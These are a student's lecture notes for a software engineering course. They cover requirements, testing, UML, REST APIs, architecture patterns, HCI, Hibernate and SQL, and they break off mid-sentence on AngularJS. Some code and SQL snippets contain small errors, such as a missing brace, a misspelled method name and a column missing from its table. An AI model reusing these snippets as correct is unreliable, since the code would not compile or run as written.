+++
title = "CSC 326: Software Engineering"
[extra]
teacher = "Dr. Sarah Heckman"
+++

[AngularJS]: https://angularjs.org/

[Spring]: https://spring.io/

[Hibernate]: https://hibernate.org/
[MariaDB]: https://mariadb.org/
[MySQL]: https://www.mysql.com/

[Cucumber]: https://cucumber.io/
[Gherkin]: https://cucumber.io/docs/gherkin/
[Mockito]: https://site.mockito.org/
[Selenium]: https://www.selenium.dev/

# Administrivia

| Weight | Component          | Additional Info                 |
|--------|--------------------|---------------------------------|
| 20%    | Onboarding (OBP)   | Aug 13 - Sept 30                |
| 40%    | Team Projects (TP) | Sept 30 - Nov 11                |
| 40%    | Weekly Quizzes     | During the week. Can make 3 up. |

* No exams! Just quizzes. :)
* Notify for absences, especially for lab.
* Extra Credit: 2 of the following activities. Each activity gives you 1 point
  on your quiz average.
  * Software Engineering Research Study: In Piazza.
  * CSC Seminars.
* Quizzes: Moodle.
* Academic Integrity:
  * As long as you cite your sources for online resources, you're good.
  * Solo quizzes are open book and everything.

# Bugs & Issues

* Fault: Underlying issue in the code/project. Caused by mistakes normally.
* Error: Incorrect program state resulting from the execution of a fault.
  *Doesn't necessarily cause failure.*
* Failure: Observable incorrect behavior.

When you run into a failure, you want to create a **minimum reproducible
example**. This is a minimum number of steps / bit of code to reproduce the
issue. You should try to **generalize** the issue as much as possible. That is
find out exactly what kind of circumstances the issue occurs under and try to
make it as generic as possible.

For our class we need a **reproduction**, **isolation**, and **generalize**
section in our bug reports. Probably want to use GitHub template.

# Maven

Maven (`mvn`) builds projects by reading the project object model (POM) file
`pom.xml` and executing a sequence of steps to reach a specified **target**.
The POM can declare dependencies, custom profiles that apply a group of
settings, build plugins that define custom targets and steps, and all that fun
stuff!

Maven looks for dependencies in the repositories section of the `pom.xml`. By
default it uses [mvnrepository.com](mvnrepository.com).

# CoffeeMaker Tools

* Frontend: HTML, [AngularJS] (not Angular), Bootstrap CSS, and CSS3.
* Backend: Apache Tomcat, Java, [Hibernate] ORM.
* Database: [MySQL] (or [MariaDB] for me).

To test the frontend, we use [Selenium]. Selenium is a browser automation tool
meant to help test web frontends. It allows you to scrape the HTML DOM to find
if elements exist and also manipulate the web browser by clicking on things or
doing other normal user interactions programmatically. Selenium is built on top
of JUnit so it makes tests easy to set up and run if you already use JUnit.

To do test, we use [Cucumber], which uses the [Gherkin]. It believes that by
making tests look closer to natural English makes it easier to write tests,
especially for non-developer users.

# Requirements Engineering

* Requirements: Definition of what the system should do.
* Types of Requirements: In general, you want more functional requirements that
  non-functional requirements because they are easier to test and verify.
  * Functional Requirements: Something that the system must explicitly do.
  * Non-functional Requirements: User-visible parts of the system not directly
    related to what the program does. (e.g. usability, privacy, performance,
    security)
  * Constraints: Non user-visible constraints that restricts the development
    process. (e.g. deployment troubles, implementation language)
* Requirements Elicitation: Process of getting the requirements.
* Requirements Validation: Process of reviewing requirements with the
  stakeholder to ensure that they are:
  * Traceable: Ensure that you can see where each requirement comes from.
  * Non-prescriptive: Says nothing about how programmers will solve the
    problem.
  * Consistent Language
  * Testable
  * Concise
* Stakeholders: People that care about the software system or want it.
* Requirements Engineering: The process of having stakeholders and engineers
  communicate to form a set of requirements / required behaviors.
* Business Case: The motivation behind the system and its requirements.
* Language of Requirements, sorted from most important to least important:
  shall, should, may, shall.

*Why do we care?* The most common causes of software project failures is
communications (requirements!) based. For example, incomplete requirements,
lack of user involvement, unrealistic expectations, etc. Cost goes up in
fixing/detecting as you go further into the project.

Requirements engineering has two parts: **analysis** and **modeling**. Analysis
is understand user needs to create a system definition. Modelling is
transforming the system's requirements into an actual software system.

## Requirements Elicitation

One of the most important parts of requirements elicitation is understanding
**why** the system needs a certain behavior. It gives context to the
requirements. This is called the **business case**.

In this class we will use a **use-case** style of requirements, which is a
semi-formal way to document requirements. It's more formal than stories but
less formal than requests for proposal.

## Use Cases

Use cases are written by the developers.

The way we build use cases is by listening to **stories**, which is a series of
things that a specific user/actor should be able to do. The actor is a
representative for a whole class of users. Normally for user stories we just
follow the **happy path** (or the case with no errors). We do this by
describing the *preconditions* and then the *main flow* of what the user does.
There are *sub-flows* which are slight changes on the main flow or more
descriptive descriptions of the flow. Then there are *alternative flows* which
describe error conditions and error handling. The main flow should connect to
alternative and sub-flows.

These user stories are collected to create a **big picture** where we combine
all the user stories to understand all the things that the system should be
able to do. This allows us to understand the **value** of the system.

We then can break up the system into **slices** which we can deliver and build
**incrementally** and adapt as requirements and teams change.

## User-Stories

User-stories are an informal and highly collaborative form of software
engineerings. (Agile!) Agile in general tries to embrace that requirements
change by regularly delivering and collaborating with the stakeholders. They
are written **by the stakeholders**.

In general user-stories should be of the form like "As an X, I want to do Y, so
that I can Z."

Since user stories are so small, teams that use them often also use **epics**.
Epics are larger changes that cannot be made in a single iteration and are
broken down into a family of stories.

User stories should follow **INVEST**:

* Investigate-able
* Negotiable
* Valuable
* Estimate-able
  * If you cannot estimate due to lack of experience, run a **spike** where you
    just do a prototype except with an epic/edgy name.
* Small: Small enough that it can be done in a single iteration.
* Testable

There are many ways to organize stories. **Kanban boards** are a list of
in-progress, done, and to-do tasks. You can also break them down differently.

## Traditional Requirements

Traditional requirements are very formal like government contracts.

# Testing

* Closed / Black Box Tests: Concerned with requirements and validation,
  regardless of implementation.
* Open / Glass / White Box Tests: Testing implementation
* Types of Coverage:
  * Class
  * Method
  * Line
  * Statement
  * Branch: Individual branches in the control flow graph.
  * Clause: Parts of statements.
  * Path: How many *unique* paths are you taking through the control flow
    graph.
  * Requirements: No code at all! Just do you have test cases for your
    requirements.
* Types of Testing:
  * Unit Testing: Test single bits of code. Normally a single function or
    component, linked to a very specific bit of the requirements or code.
  * Integration Testing: Test combinations of multiple components. Test multiple
    functions or classes. Helps catch things like "where will user input be
    sanitized?" or "where will errors be handled?"
  * Functional/System Tests: Test conducted on the entire system. Can be done
    manually or automated with tools like *Selenium*.
  * Acceptance Tests: Formal tests to determine whether the solution satisfies
    the acceptance criteria. Normally done by the customer (and in this case the
    teaching staff).
  * Regression Testing: Test things for specific functionality and run old tests
    on current code. Helps prevent breaking current functionality.
  * Selective Retesting: When you have a tests that take a long time to run,
    often you only want to run a small selection of them to give developers
    feedback more quickly.
  * Beta Testing: Unstructured testing by a subset of the users.

We care about test coverage here. Test coverage is a lot like lines of code. It
can give you a ballpark idea, but it can't tell you about missing code and many
bugs occur because of a single small line in a large function that can easily
go untested. Test coverage can help you identify *dead code* or code that isn't
required for your system. For example, why do I need this code?

There are two main approaches of development with testing. There is **test
driven development (TDD)**, where you iteratively write failing tests and code
to pass said tests. This focuses heavily on unit tests. There is **behavior
driven development (BDD)**, where you look at the behavior of the system at a
higher level. This is with the hope of having *customers* write some of the
tests. In this class we use [Cucumber] for this.

To create tests, we consider equivalence classes and boundary values. For
equivalence classes you divide up all possible inputs into sets of similar
values and pick a semi-random representative from the set. For boundary values,
you pick values that are right on the edges of your equivalence classes and
test those.

## Control Flow Graphs

Control flow graphs are useful for code analysis, both in testing and
compiling. Control flow graphs are composed of **nodes**, which are statements
represented by squares in the visual, and **branches**, which are things like
`if`, `for`, and `while` represented by diamonds in the visual.

We can compress a series of nodes with no branches into a **basic block**,
which a series of statements where executing the first statement in the block
ensures that the last one will be executed.

Using the formalism of a control flow graph and graph theory, we can make some
assertions about how much testing we need to get branch, statement, or path
coverage. In this case, branch coverage is executing all edges and statement
coverage is executing all nodes. *This is how static analysis tooling works!*

# Design

One of software engineering's main goals is to create well designed software.
However, unlike many other traditional engineering projects, software normally
has no "physical" representation, or at least one that is useful. That means
*communication is really hard*.

In this class we'll use UML because it's easy to grade, even though it's only
used by ~30% of surveyed software developers in industry.

## UML Class Diagrams

**Attributes** are just listed in the class. They're the same as association
except they're simpler value types or external types.

**Association** is where a class has a field of another class in your project.
It is represented by a black arrow with an arrow head, labeled in the middle by
the field name and on the head by the multiplicity of the field. You should
also label the base of the arrow with

**Aggregation** is where one class contains another class. It's like a stronger
version of *association*. The owned class can exist without the owning class.
This is represented the same way as association except with a white diamond
head.

**Composition** is where one class fully owns another class. It's like a super
strong version of *aggregation*, where the owned class doesn't make since
without the owning class. Normally this is an inner class. This is represented
the same was as aggregation except with a filled black triangle head.

**Generalization** is how we show inheritance of types. It is show with a white
triangle head with a solid line for class inheritance and a dashed line for
interface inheritance.

For *abstract methods* of an interface or abstract base class is italicized.

## UML Sequence Diagrams

UML sequence diagrams let us model the dynamic execution of the program, as
opposed to the static layout that class diagrams give you. Every class gets its
own line. The flow of control goes down in time and changes lanes whenever we
call a method of another class. When we change lanes, we draw a solid arrow
labeled by the name of the called method. The line goes from the previously
running line to the newly called object. The returns of methods are denoted
using a dashed line labeled by both the name of the method returning and the
returned value. When we create a new object, it's line appears. When we destroy
an object, it's line disappears.

## UML State Diagrams

State Diagrams are a higher level representation of a finite state machine
(FSM) where the entire state of the machine is represented by the FSM.

Every state is represented by a box or circle with the name of the state.

State diagrams follow the standard deterministic finite automata rules. There
is one initial state but there can be multiple final states. Every state must
be reachable from the initial state. Every state must have a path to the final
state. States not shown are error states.

Every transition arrow has optionally a **trigger**, **guard clause**, and
**activity**. The *trigger* is what causes the transition. A transition is only
taken if the *guard clause* also holds though. The *activity* is what the
application does on that trigger beyond just transition.

# REST APIs

REST (REpresentation State Transfer) is a way to interact with backend models,
controllers, and services in a language agnostic, networked way.

*Why use RESTful APIs?* REST can work over the network which allows you to keep
your proprietary code secret by hiding it behind the network. It's also the
easiest way to distribute your application. Most personal computers have web
browsers which are essentially giant JavaScript and rendering engines, so if
you design your front-end in JavaScript (or WebAssembly!), then your
application can be run without installing anything (kinda). However, JavaScript
is slow and we often want to interact with some remote data. To get around
this, we create a server in any language we want and interact with it over a
REST API. Then we have a single server we control and can optimize as we want
and share data with clients as they request.

Essentially, REST APIs (with a lot of work) can allow us to achieve the
following desireable properties of service (e.g. social networks):

* **Performance**: Appropriate component interactions.
* **Scalability**: support large numbers of components and interactions among
  components.
* **Simplicity** of interfaces.
* **Modifiability** of components.
* **Visibility** of communication between components by service agents.
* **Portability** of components by moving program code with the data.
* **Reliability** when failures within components, connectors, or data

Most REST APIs use **HTTP** as the transport protocol and
serializes/deserializes data using **JSON** (sometimes XML, Protobuf,
MessagePack, etc.).

HTTP requests have **verbs** (the type of request) and **nouns** (the resource
requested). For example `GET /recipes` has the verb of `GET` and the noun of
`/recipes`. It would return a JSON-formatted array of recipes, for example.

Some of the most common types of operations an application needs to make is
called **CRUD** operations (create, read, update, delete). Each standard CRUD
operation has its corresponding HTTP verbs.

* `GET`: Retrieve record.
* `DELETE`: Delete record.
* `POST`: Create record.
* `PUT`: Update record.

On top of normal HTTP nouns, we can add parameters to provide additional
information. This is useful if the noun represents a function call and the
parameters are the arguments to the function. For example, `GET
/dogs?color=red&state=running&location=park` has the parameters `color=red`,
`state=running`, and `location=park`.

## REST API Designer

REST APIs should never remove or change things without making a major version
number change. This is to not break old clients. Since we often want to make
breaking changes, it's good to include a major version number in the path (e.g.
`/api/v1/resource`), so you can change the version number and then make
breaking changes.

Since you (should) never remove or change things without making a major version
number change, what you expose should be very well thought out. If you're not
sure how things should be split, try to release or expose only a stable subset
as you work on the final design.

As with any API, you should name things clearly and consistently and make sure
that the user doesn't have to do checks that you (the server) could do.

In general for performance (and simplicity), REST APIs should be stateless and
cacheable, so that you can improve performance with caches more easily and
simplify the client server interactions.

If your API holds sensitive data, you should use standard authentication
protocols like *OAuth*.

To make the API more performant, when you have infinite or extremely large data
you should either stream partial responses (chunks) of data or provide some
pagination where the client requests a certain page. The page doesn't have to
be absolute. For example Discord's API for getting messages can get you n
messages after the given message ID.

## HTTP Errors

* 200: Okay.
* 400: Bad request.
* 404: Unknown path.
* 500: Internal server error.

## Frameworks

Frameworks are meant to make creating applications easier by being a collection
of opinionated defaults that help you easily set up your application.

Essentially, you are just "filling in the slots" provided by the framework.
There's generally two ways to do this: black-box (compose objects) and
white-box (inheritance), named such because in black-box you don't need to know
how the bits of the framework work (as much) but with white-box you do.

There are several ways frameworks work, but the [Spring] framework we use
extensively uses dependency injection (basically parameter passing). There are
4 main roles in the Spring framework.

* Service: Any object that can be used.
* Client: Any object that uses other objects.
* Interfaces: How a client may use the services. Never treated as concrete, so
  there's no construction or extension by a client.
* Injector: Constructs services and injects them into the client, possibly
  constructing the service as well.

Dependency injection is nice because it makes the code configurable using
config files, meaning you can change behavior without having to recompile and
helps create an isolated client. The downsides you get an explosion of types,
hard to trace code, and complex links between classes.

# Architectural Patterns

Architectural patterns consist of **component types** that perform some
function at runtime, a **topological layout** of components showing their
relationships, and a set of **connectors** that facilitate communication.

We'll list broad families and individual styles within those architectural
families but most systems are **hybrid** or combinations of different styles.

## Data Centered

Data centered architectures tend to have a centralized data store (that may be
distributed) that communicates with many clients. This is good because it
allows for *easier backups* and *easier administration* for the downside of
somewhat *harder to track errors*.

This data centered architecture is broadly split into the **repository model**
and the **blackboard model**. Of course, projects often straddle or use both of
these models.

In the repository model, the central database is passive and the clients are
active. Client's poll the repository for information and the repository. This
makes it harder to update/change the repository but potentially reduce load on
the repository. It is better for systems where data is less real-time and
people request to see things rather than get notified to see things (e.g.
YouTube, Google Drive, Spotify, Instagram, Reddit). This does mean that
everyone must agree on a data-interchange format and the repository may be a
bottleneck.

In the blackboard model, the central database is active and the clients are
active. Essentially, it's a PUB/SUB (publish/subscribe) system where clients
subscribe to updates and the central database pushes events to the clients. It
is better for systems where you need to react immediately to things rather than
request to view them (e.g. eBay, Slack, Discord, Weather Service Alerts). This
is good for systems that are non-deterministic, but it does require complex
infrastructure.

## Call and Return

In call and return you essentially just write a program like you would
normally. You organize your code into a series of function calls or similar
ideas.

There's the **main program and subprogram** split, which is literally just
procedural code where you call functions to do things. It's easy to write and
understand, but can get really messy.

There's the **object-oriented** design, which we know very well. You design the
system using interfaces and each class fulfills the interface. Because of
interfaces, you can get easier code reuse and potentially easier to understand
code as you separate certain aspects of the code get abstracted away. It can
also get really messy and hard to understand like main program and subprogram,
but it can make it easier to understand.

There's the **layered** design, where we split to design into layers where
(ideally) every layer can be swapped out for an equivalent layer and every
layer communicates with a clean, abstract interface. This is *incredibly*
common, with OS code vs userspace code, the networking stack, and good object
oriented code. This is good because it's easy to understand and extend because
every layer is independent and well encapsulated. This can be bad because
structuring layers can be incredibly difficult, causing leaky abstractions that
actually cause more harm than good. Also, performance *may* suffer because of
all the layers.

## Data Flow

In data flow style architectures, you design your system as a pipeline from a
data **source** to a data **sink**. It is good for systems that need to be
distributed or parallelized.

There's **pipe and filter** where you model your program as a set of inputs and
outputs where you do local transformations and filters on the data. This is
good because it easily handles infinite data (incrementally) and
parallelization. It's limited (intentionally) by not having knowledge of other
filters and having no shared state. This is because all filters work at the
same time. One example architecture of **map-reduce** where you represent your
problem into an easily parallelizable map function that gets applied to every
element and then a reduce section that is both associative and commutative
(e.g. sum or union) so that it can also be executed in parallel. If the reduce
part of not associative and commutative, then it may have to be done
sequentially. This can be harder to write but is easier to parallelize and
often more performant.

There's **batch sequential** where you sequentially transform data but split it
into batches to process in parallel. It can be easier to write but harder to
parallelize and potentially more buggy.

## Event Systems

For event systems there is **explicit invocation** where you request things to
be executed to change and **implicit invocation** where something changes on
the system and it executes a callback you provided.

# Human Computer Interaction (HCI)

HCI focuses on the human aspect of computer system. It tries to make systems
ergonomic and easy to use intuitively.

*Why is this important?* If you're creating a system for people, it would be
good if people can actually use it. If people can't use it or can't use it
safely, then you are wasting time and putting lives at risk. Intuitive software
also saves money in terms of support and training materials.

For example, Tesla's (early) autopilot systems allowed humans to pay too little
attention for too long. This meant that when the system suddenly requested
human input, people had to very quickly become re-adjusted to what is happening
on the road, leading to overcorrections and crashes.

One of the most important ideas of HCI is the **context for use**. That is,
what is going on around the user when they're using your software. Is it cold?
Are they stressed out? In a hurry? etc.

We'll cover three main perspectives **physical computing**, **cognitive
computing**, and **social computing**.

Physical computing tries to make things ergonomic with no distractions. So
recognize the ambient sound and lighting that will be around the user.
Understand where they'll be working. By considering that you can make your
project more comfortable to use safely and effectively. Normally you consider
**anthropometrics**, which is the shape, size, strength, etc. of the human
body. Anthropometrics help you understand issues with posture and muscle
strain.

Cognitive computing tries to understand what is going on in the persons mind.
So are they old/young, disabled, stressed, hurried, etc. By understanding what
they can understand and know you know how to make things less confusing to
them. You normally try to remove cognitive *noise*. You try to understand
people's **mental models** for how the system works and make the system operate
as closely to that mental model or shape their mental model to be as close to
the system as possible.

Social computing tries to understand how people communicate and what their
prior relationships are. This can make your software less socially awkward and
easier to use effectively. It can also help you know when to notify people to
do things. How do you facilitate communication between people? If you don't
consider this you can have communication difficulties. For example, plane
crashes if the pilot and traffic control cannot communicate because of a sudden
update.

How do you apply all those principles? **Concept design** is the process of
white boarding or otherwise generating ideas and alternative solutions. We
often talk about task flows, where you have three columns (or rows): what the
user does, how the system should function, and them some space for notes.

| User                                  | System                                                                  | Considerations for Design                                                   |
|---------------------------------------|-------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| 1. Gather new contact details         |                                                                         |                                                                             |
| 2. Locate contact area in application | Create button on home page                                              | Primary action in the app so button should be front and center of Home page |
| 3. Enter contact details              | Text fields to enter contact details                                    | Required fields: name, email, phone. Optional fields: address, birthday.    |
| 4. Save new contact details           | Save button and way to show user new contact has been created and saved | Creation success means info is read only and presented in the UI            |

You can also create a **wireframe** of what the user interface should look like
at a low-fidelity high level. This is meant to be easier to write than the
corresponding code.

# Persistent Data / Databases

In CSC 216 we did simple serialization (e.g. XML, CSV, JSON, Java
serialization, Python pickling, etc.). This is good for small data and for
human interaction but are slow for edits small with respect to the whole data
size.

However, when we want to constantly have out data be persistent and have high
performance for small edits, a database can come in handy. They store data on
the disk for persistence, but some also uses memory for performance.

The specific types of database we'll be talking about are **relational
databases**.

Relational databases model data essentially like a collection spreadsheets or
**tables**. These tables are managed by the RDBMS, which is a system optimized
for inserting, updating, selecting, and deleting data in the database. CRUD
operations! (Normally) each table represents a single class, the columns the
fields of the class, and the rows the instances of the class. Many RDBMS (e.g.
PostgreSQL, [MySQL]) use the Structured Query Language (SQL), which is a
semi-standardized language for describing queries.

*Note:* In SQL databases, we normally use `snake_case` for column names.

Why do we use relational databases here? They are commonly used in industry and
map nicely to objects. This mapping can be done systematically by an **object
relational mapping (ORM)**.

*Note:* If something can be (easily) calculated from data in the database, you
shouldn't store it because that wastes space and allows data in the database to
get out of sync. Using linear algebra terms you basically want a linearly
independent set of columns (or a basis for the data you want!).

## Hibernate

In this class we'll use the [Hibernate] object relational mapping, which is an
ORM framework that uses annotations and a config file `hibernate.cfg.xml` to
support the connection between Java objects and persistent storage. Here's an
annotated example of CoffeeMaker's `hibernate.cfg.xml`.

```xml
<?xml version="1.0" encoding="utf‐8"?>
<!DOCTYPE hibernate‐configuration SYSTEM "http://www.hibernate.org/dtd/hibernate‐configuration‐3.0.dtd">
<hibernate‐configuration>
  <session‐factory>
    <!-- Specifies the Hibernate dialect for the version of MySQL -->
    <property name="hibernate.dialect">org.hibernate.dialect.MySQL5Dialect</property>
    <!--
    Drop and re‐create the database schema on startup, useful because
    CoffeeMaker is a toy.
    -->
    <property name="hibernate.hbm2ddl.auto">create</property>
    <!--
    Connection properties, specifies the DB Drive (JDBC) and connection URL.
    -->
    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
    <property name="hibernate.connection.url"> jdbc:mysql://localhost/coffeemaker?createDatabaseIfNotExist=true&amp;allowPublicKeyRetrieval=true</property>

    <!--
    Ideally you'd create a user with minimal privileges and a strong password
    for security.
    -->
    <property name="hibernate.connection.username">root</property>
    <property name="hibernate.connection.password"></property>
    <!-- JDBC connection pool (use the built‐in), and size. -->
    <property name="hibernate.connection.pool_size">10</property>
    <!-- Echo all executed SQL to stdout -->
    <property name="show_sql">true</property>

    <!-- List of persistent classes -->
    <mapping class="edu.ncsu.csc.coffee_maker.models.persistent.Recipe" />
    <mapping class="edu.ncsu.csc.coffee_maker.models.persistent.Inventory" />
  </session‐factory>
</hibernate‐configuration>
```

Here is an annotated example of a plain Java class that uses Hibernate 

```java
@Entity
@Table(name = "recipes")
public class Recipe {
  // The columns in the database.
  // primitives don't *need* to be boxed into their Object form. But `null`
  // means that something doesn't exist, which is different from the zero value
  // of the primitive. However, if you guarantee that the column always have a
  // value then you can use the primitive.

  @Override
  @Id
  @GeneratedValue(generator = "increment")
  @GenericGenerator(name = "increment", strategy = "increment")
  private Long id;
  @NotNull
  private String name;
  @Min(0)
  private Integer price;
  @Min(0)
  private Integer coffee;
  @Min(0)
  private Integer milk;

  // Mark this as the primary key that is auto-incremented by 1 with each
  // insert. The primary key must be unique and is fast to look up by.
  public Long getId()
    return id;
  }

  // getName, setName, getPrice, setPrice, ...
}
```

Here is a simple interaction with the database to atomically save the object.

*Note:* If you open a connection to the database, you have to close the
database connection, much like with files. Otherwise you can get denial of
service by leaking connections. Sadly, `Session` does not implement
`AutoCloseable`.

```java
public void save() {
  final Session session = HibernateUtil.getSessionFactory().openSession();
  // Wrap the operation(s) in a transaction to make them atomic
  session.beginTransaction();
  // CRUD operation
  session.saveOfUpdate(this);
  // Commit the transaction, actually making the changes.
  session.getTransaction().commit();
  // Close the session!!
  session.close();
}
```

## Database Testing

*How do we test with databases tho?* Good point, they're really complicated. We
especially don't want to test on the production database because that could
really mess things up.

To get around this, we use a *test database* and *mocking*. A test database is
just your normal database except without any important data. Normally you wipe
the test database at the start of every test run to keep the tests
reproducible. We can also create a mock database, which *vastly* simplifies
thing. We basically just hard-code data and create the minimal interface that
we actually use. There are libraries that make this easier, like [Mockito].

## Structured Query Language (SQL)

SQL is a *declarative* language, which means we just state what we want.

Most SQL databases are *case insensitive*. However, some of them are so
normally we make keywords all UPPERCASE. SQL strings/characters use single
quotes.

SQL supports a fairly large set of built-in data types, although you can extend
this in some databases using plugins.

* `INT`
* `DOUBLE`
* `BOOLEAN`
* `CHAR`
* `VARCHAR($size)`: A string-like value that is given `$size` bytes. Unicode
  support varies from database to database so look at the documentation.
* See more here: https://www.w3schools.com/sql/sql_datatypes.asp

Here's an annotated example of the standard SQL you would run to create a
database, make a table in it, and add some rows.

```mysql
-- Create a database called coffeemaker
CREATE SCHEMA coffeemaker;
-- Start "using" the database, basically cd in it. (This is a MySQL thing.)
USE coffeemaker;

-- Create a table with the following fields
CREATE TABLE recipes (
  id BIGINT NOT NULL AUTO_INCREMENT,
  -- 20 bytes pseudo-string
  name VARCHAR(20) NOT NULL,
  price INT,
  coffee INT,
  milk INT,
  chocolate INT,
  -- Specify the primary key. This is the thing that is fastest to look up by
  -- and must be unique for each row.
  PRIMARY KEY (id)
);

-- Add a row into the 'recipes' table.
INSERT INTO recipes (name, price, coffee, milk, sugar, chocolate) VALUES ('Coffee', 50, 1, 1, 1, 0);

-- Select all the recipes and show them
SELECT * FROM recipes;
```

Let's look a little more at those `SELECT` statements. `SELECT` statements are
how you extract data from a database. They have the general form of

```mysql
SELECT <columns> FROM <tables> WHERE <conditions>
```

Some of the simplest types of queries are where you select multiple columns and
filter by different columns. Here's annotated examples.

```mysql
-- Select every column from the recipes table.
SELECT * FROM recipes;

-- Select the name column from the recipes table.
SELECT name FROM recipes;

-- Select the recipe name with an id of 1.
SELECT name FROM recipes WHERE id = 1;

-- Select recipes with at least one unit of coffee and one unit of milk.
SELECT * FROM recipes WHERE coffee > 1 AND milk > 1;
```

As you can see above, `*` is the wildcard (matches everything). For
comparisons, we use `>`, `>=`, `<`, `<=`, `=`, `!=` (note one equals for
equality). To check for null we use `$columns IS NULL`.

We can do more advanced queries by doing filtering, sorting, and aggregation.

```mysql
-- Filter out all non-unique column combinations
SELECT DISTINCT <columns> FROM <table>;

-- Sort the columns by the <orderby columns>
SELECT <columns> FROM <table> WHERE <conditions> ORDER BY <orderby columns>;

-- Aggregate all columns by the groupby column and count the number of matches
-- in that group.
SELECT <columns>, COUNT(<groupby column>) FROM <table> WHERE <conditions> GROUP BY <groupby column>;
```

## Using Persistent Objects

When we want to reference rows in a table, we need the row's **primary key**.
The primary key is a unique value (normally integer) which is the fastest way
to look up something. We can insert this into other tables either as the direct
value (gross! It's unchecked) or as a **foreign key**. When we use a foreign
key, the database checks that the foreign key actually is a valid key in the
table. It also does neat stuff with *cascading deletes* and the like. You can
think of the foreign key as a *reference* to the row in the table or a
restriction on the raw value.

Concretely, this is used if you want to have one class have a reference to
another class. For example, consider the following two classes (sans
annotations, IDs, etc.).

```java
class User {
  String name;
}

class Transaction {
  User purchaser;
  Integer cost;
}
```

This would result in the following two tables, users and transactions
respectively, where `purchaser` is a foreign key.

| id  | name |
|-----|------|
| 1   | Eli  |
| ... | ...  |

| id  | purchaser | cost |
|-----|-----------|------|
| ... | ...       | ...  |
| 2   | 1         | 10   |
| ... | ...       | ...  |

Here's how you create a foreign key

```mysql
CREATE TABLE transactions (
  id BIGINT NOT NULL AUTO_INCREMENT,
  purchase BIGINT,
  paid INT,
  -- id is OUR primary key
  PRIMARY KEY (id),
  -- Create a column called purchase which is a foreign key referencing the
  -- recipes.id column.
  -- If this foreign key references the same key in multiple different tables
  -- we can list them out after `REFERENCES`
  FOREIGN KEY (purchase) REFERENCES recipes(id)
);
```

As mentioned earlier, **cascading deletes** means that when we delete a row of
a table then all the rows that reference that row get deleted as well.

*What if we don't want that?* Normally what we do then is we just mark the row
as "hidden" or "deleted" but don't actually remove the data. Then the backend
knows to just ignore those (e.g. by adding a `WHERE` clause that filters it).

Sweet! Now we know how to reference a single row in another table. What if we
want to make it variadic? That is reference multiple rows in our row.

*You can't!* Well, kinda. What you do instead is create a **join table** that
provides the many to many relationship. Then you reference a "collection id" on
the join table in your referencing row and the join table has multiple rows
that use that "collection id", each row mapping to one of the reference rows.
That's a mouthful so here's an example.

`transactions`

| id | paid |
|----|------|
| 1  | 175  |
| 2  | 50   |
| 3  | 100  |
| 4  | 190  |

`transactions_recipes`

| transaction_id | recipe_id |
|----------------|-----------|
| 1              | 1         |
| 1              | 2         |
| 2              | 1         |
| 3              | 3         |
| 4              | 2         |
| 4              | 3         |

`recipes`

| id | name   | price | coffee | milk | sugar | chocolate |
|----|--------|-------|--------|------|-------|-----------|
| 1  | Coffee | 50    | 2      | 1    | 1     | 0         |
| 2  | Mocha  | 75    | 2      | 1    | 1     | 1         |
| 3  | Coffee | 100   | 5      | 0    | 0     | 0         |

As you can see, transaction 1 ordered recipe 1 and 2, transaction 2 recipe 1,
transaction 3 recipe 3, transaction 4 recipe 2 and 3.

If we then wanted to join all rows in the tables where the recipe was ordered
as part of a transaction, we would run the following query.

*Note:* This displays multiple rows when transactions have multiple recipes,
but the recipe is identical.

```mysql
SELECT *
FROM transactions AS t, transactions_recipes AS tr, recipes AS r
WHERE t.id = tr.transaction_id AND r.id = tr.recipe_id
-- t.id is higher priority for sorting than r.id
ORDER BY t.id, r.id
;
```

[Hibernate] (and really JPA) uses many annotations to automate this,
`@OneToOne`, `@OneToMany`, `@ManyToOne`, `@ManyToMany`, and
`@ElementCollection`.

# Web Frontend

Web frontends fundamentally use **HTML** (Hypertext Markup Language) which is
similar to XML (Extensible Markup Language) and **CSS** (Cascading Style
Sheets) as a way for communicating the structure of documents/webpage. Since we
want webpages to be able to modify themselves and be web apps (because browser
wars and legacy!), the language **JavaScript** was created, which is a language
which is designed to run in the browser and has a standard API for manipulating
the **DOM** (Document Object Model) which is the programmatic representation of
HTML documents.

## HTML

HTML tags are called DOM notes. You're probably somewhat familiar with it but
here's an example. HTML includes a `<head>` and `<body>` sections. The head is
where metadata (e.g. CSS, text encoding, page title). The body is the actual
document explained.

```html
<!DOCTYPE html>
<html>
<head>
  <!-- Some comment -->
  <title>Page Title</title>

  <style>
  /* Inline CSS! */
  body {
    background-color: powderblue;
  }
  p    {
    color: red;
  }
  .some-class {
    color: green;
  }
  </style>
  <!-- External CSS! -->
  <style href="css/styles.css"></style>

  <script>
  // Inline JavaScript!
  console.log("Hello from JavaScript!");
  </script>
  <!-- External JavaScript! -->
  <script src="js/foo.js"></script>
</head>
<body>
  <h1 class="some-class">This is a Heading</h1>
  <p>This is a paragraph.</p>
</body>
</html>
```

## CSS

CSS has **tags**, **classes**, and **ids** which are used to classify each DOM
element (e.g. HTML tag). Every HTML tag can have a single id and multiple
classes.

```css
/* This applies to all divs */
div {
  color: red;
}

/* This applies to any tag with class="class-selector" */
.class-selector {
  color: green;
}

/* This applies to any tag with id="id-selector" */
#id-selector {
  color: blue;
}
```

You might notice that in the above example that all those styles conflict with
each other. What if we apply all of them at the same time? **The id style would
take precedence**. Really, every style gets a *specificity* where a tag
selector gets a weight of [0,0,0,1], class [0,0,1,0], id [0,1,0,0], and inline
styling [1,0,0,0]. When we have multiple selectors apply, we get the winning
style by picking the style with the highest specificity. When multiple tags
apply (e.g. `div.class-selector`) we add them together. If any style has
`!important` then it automatically wins. If multiple things are important then
normal specificity rules apply but only for `!important` elements. For example,
in the example below the text is blue because `#id-selector` wins.

```html
<div id="id-selector" class="class-selector">div text</div>
```

CSS is called *cascading* because in the following example "span text" would be
red even though the span isn't directly colored. When things aren't directly
styled they **inherit** from their parent.

```html
<div id="id-selector" class="class-selector">
  div text <span>span text</span>
</div>
```

## JavaScript (+ AngularJS)

JavaScript is "the language of the browser". Browsers are essentially
JavaScript engines that have a rendering engine that runs on HTML and CSS. This
class won't focus on learning JavaScript specifically. It's a standard
interpreted, imperative, multi-paradigm language with plenty of resources
online, so if you're lost you should be able to easily find some online.
Instead, we'll focus on learning **AngularJS**.

AngularJS (also called Angular version 1) is the deprecated version of the
Angular web-frontend JavaScript framework. A **framework** is an opinionated
library (or set of libraries) that helps control and handle the entire
lifecycle and structure of a project. It intends to make things easier.

*Why do we use the old version of the framework?* Well, it was kinda new when
